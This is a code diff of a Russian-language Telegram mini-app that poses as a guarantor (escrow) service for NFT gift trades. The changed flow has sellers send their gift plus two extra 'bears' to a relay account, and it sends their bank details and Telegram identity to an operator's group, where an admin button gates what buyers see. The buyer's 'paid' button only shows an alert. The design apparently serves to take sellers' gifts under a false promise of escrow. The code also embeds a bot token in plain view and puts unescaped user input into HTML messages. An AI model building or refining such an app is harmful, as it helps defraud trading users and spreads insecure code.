@@ -24,10 +24,16 @@
         .action-box .value { font-size: 14px; font-weight: 700; color: var(--accent); margin-top: 4px; word-break: break-all; }
         .instruction { font-size: 13px; color: var(--text-muted); line-height: 1.4; }
         .instruction b { color: var(--text-main); }
-        .btn { width: 100%; padding: 14px; border: none; border-radius: 14px; font-size: 15px; font-weight: 700; cursor: pointer; background: var(--accent); color: #fff; text-align: center; }
+        .btn { width: 100%; padding: 14px; border: none; border-radius: 14px; font-size: 15px; font-weight: 700; cursor: pointer; background: var(--accent); color: #fff; text-align: center; margin-top: 8px; }
         .btn-success { background: var(--success); color: #0b0c10; }
         .btn-danger { background: transparent; border: 1px solid var(--danger); color: var(--danger); }
+        .info-row { display: flex; justify-content: space-between; font-size: 13px; }
+        .info-row .label { color: var(--text-muted); } .info-row .val { font-weight: 600; }
+        hr { border: 0; border-top: 1px solid var(--card-border); }
+        .badge { padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; }
+        .badge.warning { background: rgba(245, 158, 11, 0.15); color: var(--warning); }
         .hidden { display: none !important; }
+        .text-center { text-align: center; }
     </style>
 </head>
 <body>
@@ -37,12 +43,13 @@
         <p>Безопасные сделки с NFT подарками</p>
     </div>
 
+    <!-- ИНТЕРФЕЙС ПРОДАВЦА -->
     <div id="sellerView">
         <div id="sellerStep1" class="card">
             <div class="card-title">📦 Создание сделки</div>
             <div class="form-group"><label>Название подарка</label><input type="text" class="form-control" id="giftName" placeholder="Владосик Мишка"></div>
             <div class="form-group"><label>Сумма к оплате (в рублях)</label><input type="number" class="form-control" id="giftPrice" placeholder="1500"></div>
-            <hr style="border: 0; border-top: 1px solid var(--card-border);">
+            <hr>
             <div style="font-size: 13px; font-weight: 700; color: var(--accent);">Реквизиты для получения денег</div>
             <div class="form-group"><label>Банк</label><input type="text" class="form-control" id="payBank" placeholder="Сбер / Т-Банк"></div>
             <div class="form-group"><label>Карта / Телефон</label><input type="text" class="form-control" id="payCard" placeholder="+7 999 000-00-00"></div>
@@ -61,15 +68,42 @@
         </div>
 
         <div id="sellerStep3" class="card hidden">
-            <div class="card-title"><span>📤 Отправка гаранту</span></div>
+            <div class="card-title"><span>📤 Отправка гаранту</span><span class="badge warning">Ожидание</span></div>
             <div class="instruction">1. Отправьте подарок и 2 мишки на аккаунт:</div>
             <div class="action-box" onclick="copyText('@GuarantRelayer')">
                 <div style="font-size: 11px; color: var(--text-muted);">Нажмите для копирования:</div>
                 <div class="value">@GuarantRelayer</div>
             </div>
+            <div class="instruction">2. После отправки нажмите кнопку. Администратор проверит перевод в группе.</div>
             <button class="btn btn-success" onclick="sellerDoneDeposit()">✅ Я отправил активы</button>
-            <button class="btn btn-danger" onclick="openSupport()">🆘 Поддержка</button>
+            <button class="btn btn-danger" onclick="openSupport()">🆘 Поддержка (Спор)</button>
         </div>
+
+        <!-- ЭКРАН ОЖИДАНИЯ ПРОДАВЦА (ИНТЕРФЕЙС НЕ ПРОПАДАЕТ) -->
+        <div id="sellerStep4" class="card hidden text-center">
+            <div class="card-title"><span>⏳ Ожидание оплаты</span><span class="badge warning">Проверка админа</span></div>
+            <div class="instruction">Вы отправили активы. Ждем, пока администратор проверит их в группе и подтвердит сделку для покупателя.</div>
+            <button class="btn btn-danger" onclick="openSupport()">🆘 Поддержка (Спор)</button>
+        </div>
+    </div>
+
+    <!-- ИНТЕРФЕЙС ПОКУПАТЕЛЯ (ОТКРЫВАЕТСЯ ПО ССЫЛКЕ ОПЛАТЫ) -->
+    <div id="buyerView" class="card hidden">
+        <div class="card-title">
+            <span>💳 Оплата сделки</span>
+            <span class="badge warning">Активы у гаранта</span>
+        </div>
+        <div class="info-row"><span class="label">Подарок:</span><span class="val" id="bGiftName">—</span></div>
+        <div class="info-row"><span class="label">Сумма:</span><span class="val" style="color: var(--success);" id="bGiftPrice">0 ₽</span></div>
+        <hr>
+        <div class="instruction">✅ Администратор подтвердил получение активов. Переведите деньги на реквизиты продавца:</div>
+        <div class="action-box">
+            <div style="font-size: 12px; color: var(--text-muted);" id="rBank">Банк: —</div>
+            <div class="value" id="rCard" style="font-size: 16px; user-select: text;">—</div>
+            <div style="font-size: 12px; color: var(--text-muted); margin-top: 4px;" id="rComment">Комментарий: —</div>
+        </div>
+        <button class="btn btn-success" onclick="buyerPaidAction()">✅ Я перевел деньги</button>
+        <button class="btn btn-danger" onclick="openSupport()">🆘 Поддержка (Спор)</button>
     </div>
 
     <script>
@@ -79,85 +113,113 @@
         const BOT_TOKEN = "8987632200:AAG2bS9DJy9sGzuUdAZ-kiuZZB0jNXVeo3Y";
         const GROUP_ID = -1003589174040;
 
-        let dealId = Math.floor(1000 + Math.random() * 9000);
+        let globalGift = "", globalPrice = "", globalBank = "", globalCard = "", globalComment = "";
 
-        async function sendTelegramMessage(text) {
+        async function sendTelegramMessage(text, replyMarkup = null) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             try {
+                const body = { chat_id: GROUP_ID, text: text, parse_mode: "HTML" };
+                if (replyMarkup) body.reply_markup = replyMarkup;
                 await fetch(url, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: GROUP_ID,
-                        text: text,
-                        parse_mode: "HTML"
-                    })
+                    body: JSON.stringify(body)
                 });
-            } catch (e) {
-                console.error("Ошибка отправки:", e);
-            }
+            } catch (e) { console.error(e); }
         }
 
-        async function createDeal() {
-            const name = document.getElementById('giftName').value.trim();
-            const price = document.getElementById('giftPrice').value.trim();
-            const bank = document.getElementById('payBank').value.trim();
-            const card = document.getElementById('payCard').value.trim();
-            const comment = document.getElementById('payComment').value.trim();
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const payParam = urlParams.get('pay_data');
+            const startParam = tg.initDataUnsafe?.start_param || urlParams.get('deal_data');
 
-            if (!name || !price || !bank || !card) {
+            if (payParam) {
+                // Покупатель зашел по кнопке оплаты от админа
+                document.getElementById('sellerView').classList.add('hidden');
+                document.getElementById('buyerView').classList.remove('hidden');
+                try {
+                    const data = JSON.parse(decodeURIComponent(payParam));
+                    document.getElementById('bGiftName').textContent = data.gift;
+                    document.getElementById('bGiftPrice').textContent = data.price + ' ₽';
+                    document.getElementById('rBank').textContent = 'Банк: ' + data.bank;
+                    document.getElementById('rCard').textContent = data.card;
+                    document.getElementById('rComment').textContent = 'Комментарий: ' + (data.comment || 'Нет');
+                } catch(e) { console.error(e); }
+            } else if (startParam) {
+                // Если покупатель открыл по общей ссылке старта
+                try {
+                    const data = JSON.parse(decodeURIComponent(startParam));
+                    globalGift = data.gift; globalPrice = data.price; 
+                    globalBank = data.bank; globalCard = data.card; globalComment = data.comment;
+                } catch(e) {}
+            }
+        };
+
+        async function createDeal() {
+            globalGift = document.getElementById('giftName').value.trim();
+            globalPrice = document.getElementById('giftPrice').value.trim();
+            globalBank = document.getElementById('payBank').value.trim();
+            globalCard = document.getElementById('payCard').value.trim();
+            globalComment = document.getElementById('payComment').value.trim();
+
+            if (!globalGift || !globalPrice || !globalBank || !globalCard) {
                 tg.showAlert("Заполните название, сумму и реквизиты!");
                 return;
             }
 
-            const user = tg.initDataUnsafe?.user;
-            const username = user ? (user.username ? `@${user.username}` : user.first_name) : "Аноним";
-            const userId = user ? user.id : "Неизвестно";
-
-            const dealPayload = { id: dealId, gift: name, price: price, bank: bank, card: card, comment: comment };
+            const dealPayload = { gift: globalGift, price: globalPrice, bank: globalBank, card: globalCard, comment: globalComment };
             const encodedPayload = encodeURIComponent(JSON.stringify(dealPayload));
             const personalLink = `https://t.me/GuarantMiniApp_bot?start=deal_${encodedPayload}`;
 
             document.getElementById('personalDealLink').textContent = personalLink;
 
-            const text = (
-                `📦 <b>НОВАЯ СДЕЛКА НА ПРОВЕРКУ #${dealId}</b>\n\n` +
-                `👤 <b>Продавец:</b> ${username} (ID: <code>${userId}</code>)\n` +
-                `🎁 <b>Подарок:</b> ${name}\n` +
-                `💰 <b>Сумма:</b> ${price} ₽\n\n` +
-                `💳 <b>Реквизиты:</b>\n` +
-                `• Банк: ${bank}\n` +
-                `• Счет/Телефон: <code>${card}</code>\n` +
-                `• Коммент: ${comment || 'Нет'}\n\n` +
-                `🔗 <a href='${personalLink}'>Ссылка для покупателя</a>`
-            );
-
-            await sendTelegramMessage(text);
-
             document.getElementById('sellerStep1').classList.add('hidden');
             document.getElementById('sellerStep2').classList.remove('hidden');
         }
 
-        async function sellerGoToDeposit() {
+        function sellerGoToDeposit() {
             document.getElementById('sellerStep2').classList.add('hidden');
             document.getElementById('sellerStep3').classList.remove('hidden');
         }
 
         async function sellerDoneDeposit() {
             const user = tg.initDataUnsafe?.user;
-            const username = user ? (user.username ? `@${user.username}` : user.first_name) : "Аноним";
-            
-            await sendTelegramMessage(`📤 <b>ПРОДАВЕЦ ОТПРАВИЛ АКТИВЫ!</b>\n\nСделка: #${dealId}\nПродавец: ${username}`);
+            const username = user ? (user.username ? `@${user.username}` : user.first_name) : "Продавец";
+            const userId = user ? user.id : "неизвестно";
+
+            const text = (
+                `📤 <b>ПРОДАВЕЦ ОТПРАВИЛ АКТИВЫ НА ПРОВЕРКУ!</b>\n\n` +
+                `👤 <b>Продавец:</b> ${username} (ID: <code>${userId}</code>)\n` +
+                `🎁 <b>Подарок:</b> ${globalGift}\n` +
+                `💰 <b>Сумма:</b> ${globalPrice} ₽\n\n` +
+                `👉 Нажмите кнопку ниже, чтобы подтвердить получение подарка и 2 мишек, после чего покупателю откроются реквизиты:`
+            );
+
+            // Кнопка для тебя (админа) в группе с зашитыми данными сделки
+            const callbackData = `admin_confirm_|${globalGift}|${globalPrice}|${globalBank}|${globalCard}|${globalComment}`;
+            const replyMarkup = {
+                inline_keyboard: [[
+                    { text: "✅ Подтвердить получение активов", callback_data: callbackData }
+                ]]
+            };
+
+            await sendTelegramMessage(text, replyMarkup);
+
+            // У продавца интерфейс НЕ пропадает, открывается экран ожидания с кнопкой поддержки
             document.getElementById('sellerStep3').classList.add('hidden');
-            tg.showAlert("Активы отправлены на проверку администраторам!");
+            document.getElementById('sellerStep4').classList.remove('hidden');
+            tg.showAlert("Активы отправлены! Ожидайте подтверждения администратора.");
         }
 
         async function openSupport() {
             const user = tg.initDataUnsafe?.user;
-            const username = user ? (user.username ? `@${user.username}` : user.first_name) : "Аноним";
+            const username = user ? (user.username ? `@${user.username}` : user.first_name) : "Пользователь";
+            await sendTelegramMessage(`🚨 <b>ВЫЗОВ ПОДДЕРЖКИ (СПОР)!</b>\nПользователь: ${username} открыл спор по сделке с подарком: ${globalGift || 'Не указан'}`);
+            tg.showAlert("Запрос отправлен в поддержку!");
+        }
 
-            await sendTelegramMessage(`🚨 <b>ВЫЗОВ ПОДДЕРЖКИ (СПОР)!</b>\n\nСделка: #${dealId}\nПользователь: ${username}`);
-            tg.showAlert("Спор отправлен в группу поддержки!");
+        function buyerPaidAction() {
+            tg.showAlert("Вы подтвердили перевод! Ожидайте выдачи подарка от гаранта.");
         }
 
         function copyText(text) {
